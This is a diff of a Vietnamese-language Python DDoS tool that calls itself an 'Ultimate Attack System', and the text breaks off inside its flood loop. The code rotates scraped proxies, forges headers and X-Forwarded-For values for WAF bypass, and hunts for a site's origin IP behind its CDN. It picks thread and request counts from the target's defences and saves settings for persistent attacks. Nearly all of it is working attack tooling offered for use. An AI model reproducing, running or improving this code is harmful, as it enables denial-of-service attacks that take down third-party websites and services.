@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 # -*- coding: utf-8 -*-
-# ☠️ ©2025 Quang Bao DDos Attack ☠️
+# ©️ Quang Bảo 2025 - All Rights Reserved
 
 import requests
 import threading
@@ -13,355 +13,159 @@ import random
 import hashlib
 import json
 from datetime import datetime
+import socket
+import ssl
 import whois
 import dns.resolver
 from bs4 import BeautifulSoup
+import hmac
+import base64
+import sys
+import struct
 import asyncio
+import http.client
 import aiohttp
 from concurrent.futures import ThreadPoolExecutor
 from rich.console import Console
+from rich.table import Table
 from rich.panel import Panel
 from rich.prompt import Prompt, Confirm
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from rich.theme import Theme
-from rich.table import Table
+from rich.text import Text
 from rich import print as rprint
+from rich.layout import Layout
 
-# Initialize console with theme
+# Attempt to import h2 for HTTP/2 support
+try:
+    import h2.connection
+    import h2.config
+    HTTP2_AVAILABLE = True
+except ImportError:
+    HTTP2_AVAILABLE = False
+    rprint("[yellow][CẢNH BÁO] Không tìm thấy module 'h2'. Tấn công HTTP/2 sẽ bị vô hiệu hóa. Cài đặt bằng 'pip install h2'[/]")
+
+# Initialize rich console with theme
 custom_theme = Theme({
-    "info": "bold cyan",
-    "warning": "bold yellow",
-    "error": "bold red",
-    "success": "bold green",
-    "highlight": "bold magenta",
-    "extra": "bold white",
-    "blue": "bold blue",
-    "dimmed": "dim magenta",
-    "purple": "bold purple",
-    "dim_cyan": "dim cyan",
-    "yellow": "bold yellow",
-    "dim_green": "dim green"
+    "info": "cyan",
+    "warning": "yellow",
+    "error": "red bold",
+    "success": "green bold",
+    "highlight": "bright_magenta",
 })
 console = Console(theme=custom_theme)
 
-# Code rain effect
-def generate_code_rain(width=30, height=5, frame=0):
-    chars = "   "
-    rain = []
-    for i in range(height):
-        offset = (frame + i) % height
-        line = "".join(random.choice(chars) if random.random() > 0.1 else " " for _ in range(width))
-        rain.append(f"[dim_green]{line}[/]")
-    return "\n".join(rain)
+# Hacker-style ASCII banner
+def display_banner():
+    banner = Text("""
+          ╔════════════════════════════════════╗
+          ║   © Quang Bao 2025 - DDoS Tool     ║
+          ║      Ultimate Attack System        ║
+          ╚════════════════════════════════════╝
+  Không giỏi, không tài, không sắc ,không tiền ,không tình 
+ """, style="success")
+    console.print(Panel(banner, title="DDoS System", border_style="highlight"))
 
-# Matrix loading effect
-def matrix_effect(speed="fast"):
-    message = "Đang vào vui lòng chờ...©2025 Quang Bao DDos Attack..."
-    colors = ["cyan", "magenta", "purple"]
-    symbols = ["⚡", "★", "☠️", "⚙"]
-    radar_frames = ["◢", "◣", "◤", "◥"]
-    sound_effects = ["*BEEP*", "*TICK*", "*HUM*", "*ZAP*"]
-    spinners = ["arc", "dots", "bounce", "point"]
-    sleep_time = 0.03 if speed == "fast" else 0.06
-    
-    with Progress(
-        SpinnerColumn(spinner_name=random.choice(spinners)),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(bar_width=15, style="red", complete_style="cyan"),
-        console=console
-    ) as progress1, Progress(
-        SpinnerColumn(spinner_name=random.choice(spinners)),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(bar_width=15, style="magenta", complete_style="purple"),
-        console=console
-    ) as progress2, Progress(
-        SpinnerColumn(spinner_name=random.choice(spinners)),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(bar_width=15, style="blue", complete_style="green"),
-        console=console
-    ) as progress3:
-        task1 = progress1.add_task("[bold cyan]Kết nối mạng[/]", total=len(message))
-        task2 = progress2.add_task("[bold magenta]Tải module[/]", total=len(message))
-        task3 = progress3.add_task("[bold green]Kích hoạt hệ thống[/]", total=len(message))
-        
-        radar_index = 0
-        for i in range(len(message) + 1):
-            partial_message = message[:i]
-            color = colors[i % len(colors)]
-            symbol = random.choice(symbols)
-            radar = radar_frames[radar_index % len(radar_frames)]
-            sound = random.choice(sound_effects)
-            style = "bold" if i % 2 == 0 else "dim"
-            display_text = f"[bold {color}]{radar} {symbol} {partial_message} {symbol} {radar} [yellow]{sound}[/]"
+# File integrity check
+EXPECTED_HASH = None
 
-            console.print(generate_code_rain(frame=i), justify="center")
-            console.print("")
-            progress1.update(task1, advance=1, description=f"[bold cyan]Kết nối mạng: {display_text}[/]")
-            if i >= len(message) // 3:
-                progress2.update(task2, advance=1, description=f"[bold magenta]Tải module: {display_text}[/]")
-            if i >= 2 * len(message) // 3:
-                progress3.update(task3, advance=1, description=f"[bold green]Kích hoạt hệ thống: {display_text}[/]")
-            
-            radar_index += 1
-            time.sleep(sleep_time)
-        
-        for style in ["dim cyan", "bold cyan", "cyan", "bold cyan", "dim cyan"]:
-            panel = Panel(
-                f"[success]Hệ thống đã sẵn sàng! Kết nối đến Bình Nguyên Vô Tận... [✓][/] [yellow]*PULSE*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-                title="[bold purple]☠️ CYBERSTRIKE PRO v16 ☠️[/]",
-                border_style=style
-            )
-            console.print("")
-            console.print(generate_code_rain(frame=i), justify="center")
-            console.print("")
-            console.print(panel)
-            time.sleep(0.15)
-        time.sleep(0.5)
-
-# Theme selection
-def select_theme():
-    colors = ["cyan", "magenta", "green", "blue", "purple"]
-    speeds = ["fast", "slow"]
-    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn theme màu:[/]")
-    for color in colors:
-        console.print(f"[bold {color}]  - {color.capitalize()} █[/]")
-        time.sleep(0.03)
-    color_choice = hacker_prompt("Nhập màu (cyan/magenta/green/blue/purple): ", default="purple", choices=colors)
-    console.print("[bold cyan]┌─[quangbao㉿attack]─[~]\n└─# Chọn tốc độ hiệu ứng:[/]")
-    for speed in speeds:
-        console.print(f"[bold yellow]  - {speed.capitalize()} ⚡[/]")
-        time.sleep(0.03)
-    speed_choice = hacker_prompt("Nhập tốc độ (fast/slow): ", default="fast", choices=speeds)
-    console.print(f"[success]Đã chọn theme [bold {color_choice}]{color_choice.capitalize()}[/] và tốc độ [bold yellow]{speed_choice.capitalize()}[/] [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-    return color_choice, speed_choice
-
-# Display logo
-def display_logo(theme_color):
-    logo = f"""
-[bold {theme_color}]        ________
-       /|_||_\`.__
-      (   _    _ _\`-(_)--(_)-(_) [/]
-       `-_  CYBERSTRIKE  _-'
-          `._  v16  _.' ☠️
-"""
-    colors = ["magenta", "cyan", "purple", "blue"]
-    for i, line in enumerate(logo.splitlines()):
-        console.clear()
-        console.print("\n".join(logo.splitlines()[:i+1]), style=colors[i % len(colors)])
-        time.sleep(0.03)
-    console.print(f"[success]CYBERSTRIKE PRO v16 [✓][/] [yellow]*ZAP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-
-# Radar effect
-def display_radar_effect(theme_color):
-    frames = [
-        f"[bold {theme_color}]╠══╦══╩══╦══╗ [⚡ QUÉT MỤC TIÊU ⚡] ╠══╗[/] ◢",
-        f"[bold magenta]╠══╦══╩══╦══╗ [★ QUÉT MỤC TIÊU ★] ╠══╗[/] ◣",
-        f"[bold green]╠══╦══╩══╦══╗ [☆ QUÉT MỤC TIÊU ☆] ╠══╗[/] ◤",
-        f"[bold yellow]╠══╦══╩══╦══╗ [⚡ QUÉT MỤC TIÊU ⚡] ╠══╗[/] ◥"
-    ]
-    for frame in frames:
-        console.clear()
-        console.print(frame)
-        time.sleep(0.08)
-    console.clear()
-
-# Exit banner
-def display_exit_banner(theme_color):
-    frames = [
-        f"[bold {theme_color}]╠══╩══╩══╩══╩══╩══╦══╗ [⚡ TẠM BIỆT HACKER ⚡][/]",
-        f"[bold magenta]╠══╩══╩══╩══╩══╩══╦══╗ [★ TẠM BIỆT HACKER ★][/]",
-        f"[bold green]╠══╩══╩══╩══╩══╩══╦══╗ [☆ TẠM BIỆT HACKER ☆][/]"
-    ]
-    for frame in frames:
-        console.clear()
-        console.print(frame)
-        time.sleep(0.1)
-    console.clear()
-
-# Test proxy
-async def test_proxy(proxy, timeout=10):
-    try:
-        async with aiohttp.ClientSession() as session:
-            start = time.time()
-            for scheme in ["http", "https"]:
-                test_url = f"{scheme}://httpbin.org/ip"
-                try:
-                    async with session.get(test_url, proxy=proxy, timeout=timeout) as response:
-                        if response.status == 200:
-                            return True, (time.time() - start) * 1000
-                except aiohttp.ClientError:
-                    continue
-        return False, float('inf')
-    except Exception as e:
-        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-        console.print(f"[warning]Lỗi kiểm tra proxy {proxy}: [red]{error_msg}[/] [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return False, float('inf')
-
-# Fetch proxies
-async def fetch_proxies():
-    global PROXY_LIST
-    if len(PROXY_LIST) >= 50:
-        console.print("[success]Sử dụng proxy hiện tại [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-        "https://proxylist.geonode.com/api/proxy-list"
-    ]
-    proxies = []
-    for source in sources:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(source, timeout=10) as response:
-                    if response.status == 200:
-                        if source.endswith(".txt"):
-                            text = await response.text()
-                            proxies.extend([f"http://{line.strip()}" for line in text.splitlines() if line.strip()])
-                        else:
-                            data = await response.json()
-                            if isinstance(data, list):
-                                proxies.extend([f"http://{proxy['ip']}:{proxy['port']}" for proxy in data])
-                            elif isinstance(data, dict) and 'data' in data:
-                                proxies.extend([f"http://{proxy['ip']}:{proxy['port']}" for proxy in data['data']])
-                        console.print(f"[success]Lấy được [bold {theme_color}]{len(proxies)}[/] proxy từ {source} [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        except Exception as e:
-            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-            console.print(f"[error]Lỗi lấy proxy từ {source}: [red]{error_msg}[/] [✗][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-    PROXY_LIST = proxies[:200]
-
-# Filter active proxies
-async def filter_active_proxies(theme_color):
-    global PROXY_LIST
-    await fetch_proxies()
-    if not PROXY_LIST:
-        console.print(f"[warning]Không có proxy khả dụng! Chạy không proxy. [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return
-    tasks = [test_proxy(proxy, timeout=10) for proxy in PROXY_LIST]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    active_proxies = []
-    for proxy, (is_active, response_time) in zip(PROXY_LIST, results):
-        if is_active and response_time < 1000:
-            active_proxies.append((proxy, response_time))
-    active_proxies.sort(key=lambda x: x[1])
-    PROXY_LIST = [proxy for proxy, response_time in active_proxies if response_time < 200]
-    console.print(f"[success]Lọc được [bold {theme_color}]{len(PROXY_LIST)}[/] proxy hoạt động (nhanh nhất <200ms) [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-
-# Refresh proxies periodically
-async def refresh_proxies_periodically():
-    while True:
-        await filter_active_proxies(theme_color)
-        await asyncio.sleep(30)
-
-# Hacker prompt
-def hacker_prompt(message, default=None, theme_color="purple", choices=None):
-    symbols = ["⚡", "★", "☠️", "⚙"]
-    colors = ["cyan", "magenta", "purple"]
-    prompt_text = f"[bold {random.choice(colors)}]┌─[quangbao㉿attack]─[~]─[{random.choice(symbols)}]\n└─# [bold blue]{message}[/]"
-    console.print("")
-    try:
-        if choices:
-            return Prompt.ask(prompt_text, default=default, choices=choices)
-        return Prompt.ask(prompt_text, default=default)
-    except Exception as e:
-        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-        console.print(f"[error]Lỗi nhập liệu: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return default
-
-# Check auth key
-def check_auth_key(theme_color):
-    console.clear()
-    console.print(f"[bold {theme_color}]CHÀO MỪNG ĐẾN BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
-    time.sleep(0.5)
-    console.clear()
-    key = hacker_prompt("Nhập key xác thực: ", theme_color=theme_color)
-    if key != "baoddos":
-        console.print("[error]Key không đúng! Thoát. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        exit(1)
-    console.print("[success]Key hợp lệ! Truy cập hệ thống. [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-
-# Check file integrity
 def check_file_integrity():
     global EXPECTED_HASH
-    EXPECTED_HASH = None
     try:
         with open(__file__, 'rb') as f:
             file_content = f.read()
             file_hash = hashlib.sha256(file_content).hexdigest()
             if EXPECTED_HASH is None:
                 EXPECTED_HASH = file_hash
-                console.print(f"[success]Tạo mã băm: [bold magenta]{file_hash[:10]}...[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+                console.print(f"[warning][HỆ THỐNG] Tạo mã băm mới: {file_hash}[/]")
             elif file_hash != EXPECTED_HASH:
-                console.print("[error]Tệp bị thay đổi! Thoát. [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+                console.print("[error][LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.[/]")
                 exit(1)
     except Exception as e:
-        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-        console.print(f"[error]Lỗi kiểm tra: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+        console.print(f"[error][LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}[/]")
         exit(1)
 
-# Loading animation
-def loading_animation(message, duration, theme_color):
+# Clear screen
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Target selection effect with progress bar
+def target_selection_effect(target_type):
     with Progress(
-        SpinnerColumn(spinner_name="arc"),
+        SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
-        BarColumn(bar_width=20, style="red", complete_style="cyan"),
+        BarColumn(),
         console=console
     ) as progress:
-        task = progress.add_task(f"[bold {theme_color}]{message}[/]", total=100)
+        task = progress.add_task(f"[info]KHÓA MỤC TIÊU: {target_type.upper()}[/]", total=100)
         for i in range(0, 101, 25):
-            progress.update(task, advance=25, description=f"[bold {theme_color}]{message} [{i}%] ☠️[/]")
-            time.sleep(duration / 4)
-        progress.update(task, description=f"[success]{message} [✓][/] [yellow]*BOOM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+            progress.update(task, advance=25, description=f"[info]KHÓA MỤC TIÊU: {target_type.upper()} [{i}%]...[/]")
+            time.sleep(0.3)
+        progress.update(task, description=f"[success]MỤC TIÊU ĐÃ KHÓA: {target_type.upper()} [100%]![/]")
 
-# User agents
+# Loading animation
+def loading_animation(message, duration):
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        console=console
+    ) as progress:
+        task = progress.add_task(f"[info]{message}[/]", total=100)
+        for i in range(0, 101, 25):
+            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
+            time.sleep(duration / 4)
+        progress.update(task, description=f"[success]{message} [100%]![/]")
+
+# User-Agent list
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
+    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
 ]
 
-# Generate random headers
+# Random headers for WAF bypass
 def generate_random_headers():
-    fake_ips = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(100)]
     return {
         'User-Agent': random.choice(USER_AGENTS),
-        'Accept': random.choice(['text/html', 'application/json', 'application/xml', '*/*']),
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7']),
+        'Accept': random.choice(['text/html', 'application/json', '*/*']),
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
         'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
         'Connection': 'keep-alive',
-        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
-        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com', 'https://facebook.com']),
-        'X-Forwarded-For': random.choice(fake_ips),
-        'Cookie': f'sessionid={random.randint(100000,999999)}; lang={random.choice(["en", "vi", "fr"])}',
+        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
+        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
+        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'DNT': random.choice(['1', '0']),
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
-        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'no-cors']),
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': random.choice(['document', 'script', 'style'])
     }
 
-# Proxy list
-PROXY_LIST = []
+# Proxy list for rotation
+PROXY_LIST = [
+    # Add your proxy list here
+]
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
+
+# Random POST data
+POST_DATA = {
+    "key": random.randint(1, 9999999),
+    "value": random.random(),
+    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
+    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
+    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
+}
 
 # Global counters
 manager = threading.Lock()
 success_count = 0
 error_count = 0
 response_times = []
-proxy_error_count = 0
-waf_bypass_count = 0
-rps_data = []
 
 # Validate URL
 def validate_url(url):
-    if not url:
-        raise ValueError("URL không được để trống")
     if not url.startswith(('http://', 'https://')):
         url = 'http://' + url
     try:
@@ -370,174 +174,60 @@ def validate_url(url):
             raise ValueError("URL không hợp lệ")
         return url
     except Exception as e:
-        raise ValueError(f"URL không hợp lệ: {str(e)}")
+        raise ValueError(f"URL không hợp lệ: {e}")
 
-# Validate IP
-def validate_ip(ip):
-    if not ip:
-        return False
-    parts = ip.split('.')
-    if len(parts) != 4:
-        return False
+# Save attack configuration for persistent mode
+def save_attack_config(url, num_threads, requests_per_thread, target_type):
+    config = {
+        "url": url,
+        "num_threads": num_threads,
+        "requests_per_thread": requests_per_thread,
+        "target_type": target_type,
+        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    }
     try:
-        return all(0 <= int(part) <= 255 for part in parts)
-    except ValueError:
-        return False
+        with open("persistent_attack.json", "w") as f:
+            json.dump(config, f)
+        console.print(f"[warning][HỆ THỐNG] Cấu hình tấn công liên tục đã lưu: {url}[/]")
+    except Exception as e:
+        console.print(f"[error][LỖI] Không thể lưu cấu hình tấn công: {str(e)}[/]")
 
-# Smart resolve domain to IP
-def smart_resolve_domain_to_ip(domain, theme_color):
-    domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
-    dns_servers = [
-        ('Google', ['8.8.8.8', '8.8.4.4']),
-        ('Cloudflare', ['1.1.1.1', '1.0.0.1']),
-        ('OpenDNS', ['208.67.222.222', '208.67.220.220'])
-    ]
-    cdn_indicators = ['cloudflare', 'akamai', 'fastly', 'incapsula', 'sucuri']
-    common_subdomains = ['direct', 'origin', 'www', 'mail']
-    results = []
-    seen_ips = set()
-
-    def is_cdn_ip(ip, resolved_domain):
-        try:
-            reverse = dns.resolver.resolve(dns.name.from_text(ip).reverse_name(), 'PTR')
-            hostname = str(reverse[0].target).lower()
-            return any(cdn in hostname for cdn in cdn_indicators)
-        except Exception:
-            return False
-
-    def calculate_priority(result):
-        score = 0
-        if result['cdn'] == 'Không':
-            score += 100
-        if result['type'] == 'A':
-            score += 50
-        if result['domain'] == domain:
-            score += 25
-        return score
-
-    for provider, servers in dns_servers:
-        resolver = dns.resolver.Resolver()
-        resolver.nameservers = servers
-        resolver.lifetime = 5.0
-        for record_type in ['A', 'AAAA']:
-            try:
-                answers = resolver.resolve(domain, record_type)
-                for rdata in answers:
-                    ip = str(rdata)
-                    if ip not in seen_ips:
-                        is_cdn = is_cdn_ip(ip, domain)
-                        results.append({
-                            'ip': ip,
-                            'type': record_type,
-                            'provider': provider,
-                            'cdn': 'Có' if is_cdn else 'Không',
-                            'domain': domain,
-                            'priority': None
-                        })
-                        seen_ips.add(ip)
-            except Exception as e:
-                error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                console.print(f"[warning]Lỗi truy vấn {record_type} từ {provider}: [red]{error_msg}[/] [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-
-    for subdomain in common_subdomains:
-        test_domain = f"{subdomain}.{domain}"
-        for provider, servers in dns_servers:
-            resolver = dns.resolver.Resolver()
-            resolver.nameservers = servers
-            resolver.lifetime = 5.0
-            try:
-                answers = resolver.resolve(test_domain, 'A')
-                for rdata in answers:
-                    ip = str(rdata)
-                    if ip not in seen_ips:
-                        is_cdn = is_cdn_ip(ip, test_domain)
-                        results.append({
-                            'ip': ip,
-                            'type': 'A',
-                            'provider': provider,
-                            'cdn': 'Có' if is_cdn else 'Không',
-                            'domain': test_domain,
-                            'priority': None
-                        })
-                        seen_ips.add(ip)
-            except Exception:
-                continue
-
-    if results:
-        for result in results:
-            result['priority'] = calculate_priority(result)
-        results.sort(key=lambda x: x['priority'], reverse=True)
-
-        table = Table(
-            title=f"[bold {theme_color}]PHÂN TÍCH IP CHO {domain}[/]",
-            border_style="bold cyan",
-            header_style="bold magenta",
-            show_lines=True
-        )
-        table.add_column("Ưu tiên", style="bold yellow", justify="center", width=10)
-        table.add_column("IP", style="bold green", justify="center", width=15)
-        table.add_column("Loại", style="bold cyan", justify="center", width=8)
-        table.add_column("Nhà cung cấp DNS", style="bold magenta", justify="center", width=15)
-        table.add_column("CDN?", style="bold yellow", justify="center", width=8)
-        table.add_column("Tên miền", style="bold blue", justify="center", width=20)
-        
-        for i, result in enumerate(results, 1):
-            style = "bold green" if i == 1 else "green"
-            priority_text = f"[bold yellow]#{i} ({result['priority']})[/]" if i == 1 else f"[yellow]#{i}[/]"
-            table.add_row(
-                priority_text,
-                f"[{style}]{result['ip']}[/]",
-                result['type'],
-                result['provider'],
-                result['cdn'],
-                result['domain']
-            )
-        
-        console.print("")
-        console.print(table)
-
-        selected_ip = results[0]['ip']
-        summary = Panel(
-            f"[bold {theme_color}]IP được chọn:[/] [bold green]{selected_ip}[/]\n"
-            f"[bold {theme_color}]Loại:[/] [bold cyan]{results[0]['type']}[/]\n"
-            f"[bold {theme_color}]Nhà cung cấp:[/] [bold magenta]{results[0]['provider']}[/]\n"
-            f"[bold {theme_color}]CDN:[/] [bold yellow]{results[0]['cdn']}[/]\n"
-            f"[bold {theme_color}]Tên miền:[/] [bold blue]{results[0]['domain']}[/]\n"
-            f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-            title="[bold purple]TÓM TẮT IP GỐC[/]",
-            border_style="bold cyan"
-        )
-        console.print("")
-        console.print(summary)
-        console.print(f"[success]IP gốc được chọn: [bold {theme_color}]{selected_ip}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return selected_ip
-    else:
-        console.print(f"[warning]Không tìm thấy IP cho {domain}! [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        return None
-
-# Assess target security
-def assess_target_security(url, theme_color):
+# Assess target security level
+def assess_target_security(url):
     security_level = "TRUNG BÌNH"
     recommended_threads = 1000
     recommended_requests = 1000
 
     try:
-        response = requests.head(url, headers=generate_random_headers(), timeout=10)
+        # Check HTTP headers for security indicators
+        response = requests.head(url, headers=generate_random_headers(), timeout=5)
         headers = response.headers
-        waf_indicators = ['cloudflare', 'akamai', 'sucuri']
+
+        # Check for WAF or CDN presence
+        waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'incapsula']
         server = headers.get('Server', '').lower()
         cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
+
+        # Check for rate limiting
         rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
+
+        # Check WHOIS information for domain age
         domain = urllib.parse.urlparse(url).hostname
         whois_info = whois.whois(domain)
         creation_date = whois_info.get('creation_date')
-        domain_age = (datetime.now() - creation_date).days if creation_date and isinstance(creation_date, datetime) else 0
+        if creation_date:
+            if isinstance(creation_date, list):
+                creation_date = creation_date[0]
+            domain_age = (datetime.now() - creation_date).days
+        else:
+            domain_age = 0
 
+        # Evaluate security level
         if cdn_waf_detected or rate_limit:
             security_level = "CAO"
             recommended_threads = 5000
             recommended_requests = 2000
-        elif domain_age > 365:
+        elif domain_age > 365:  # Older domains might have better security
             security_level = "TRUNG BÌNH"
             recommended_threads = 2000
             recommended_requests = 1000
@@ -546,595 +236,1076 @@ def assess_target_security(url, theme_color):
             recommended_threads = 500
             recommended_requests = 500
 
-        console.print(f"[success]Bảo mật: [bold magenta]{security_level}[/], Luồng: [bold {theme_color}]{recommended_threads:,}[/], Yêu cầu: [bold {theme_color}]{recommended_requests:,}[/] [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+        console.print(f"[info][HỆ THỐNG] Đánh giá bảo mật: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}[/]")
+
     except Exception as e:
-        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-        console.print(f"[error]Lỗi đánh giá: [red]{error_msg}[/]. Dùng mặc định. [✗][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+        console.print(f"[warning][HỆ THỐNG] Không thể đánh giá bảo mật: {str(e)}. Sử dụng giá trị mặc định.[/]")
+        security_level = "TRUNG BÌNH"
+        recommended_threads = 1000
+        recommended_requests = 1000
 
     return security_level, recommended_threads, recommended_requests
 
-# Adjust threads for device
-def adjust_threads_for_device(num_threads, num_requests):
-    cpu_count = multiprocessing.cpu_count()
-    max_threads = min(num_threads, cpu_count * 1000)
-    max_requests = min(num_requests, 9999999)
-    console.print(f"[success]Điều chỉnh: [bold {theme_color}]{max_threads:,}[/] luồng, [bold {theme_color}]{max_requests:,}[/] yêu cầu trên [bold magenta]{cpu_count}[/] CPU. [✓][/] [yellow]*PING*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-    return max_threads, max_requests
-
-# Advanced CLOG attack
-def advanced_clog_attack(url, requests_per_thread, duration, progress, task, theme_color):
-    global success_count, error_count, response_times, proxy_error_count, waf_bypass_count, rps_data
-    session = requests.Session()
-    start_time = time.time()
-    max_retries = 15
-    proxy_index = 0
-    sound_effects = ["*BOOM*", "*CRASH*", "*ZAP*", "*VORTEX*", "*KABOOM*"]
-    http_methods = ['GET', 'POST', 'HEAD']
-    endpoints = ['', '/api', '/login', '/wp-admin', '/admin', '/graphql']
-    payloads = [
-        {'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))},
-        {'data': json.dumps({'id': random.randint(1, 1000), 'value': random.random()})},
-        {'search': f'term{random.randint(1, 999)}'},
-        {}
-    ]
-    last_rps_time = start_time
-
-    try:
-        while time.time() - start_time < duration:
-            retries = 0
-            current_proxy = get_random_proxy()
-            while retries < max_retries:
-                try:
-                    if current_proxy:
-                        loop = asyncio.new_event_loop()
-                        asyncio.set_event_loop(loop)
-                        try:
-                            proxy_active, _ = loop.run_until_complete(test_proxy(current_proxy, timeout=10))
-                        finally:
-                            loop.close()
-                        if not proxy_active:
-                            with manager:
-                                proxy_error_count += 1
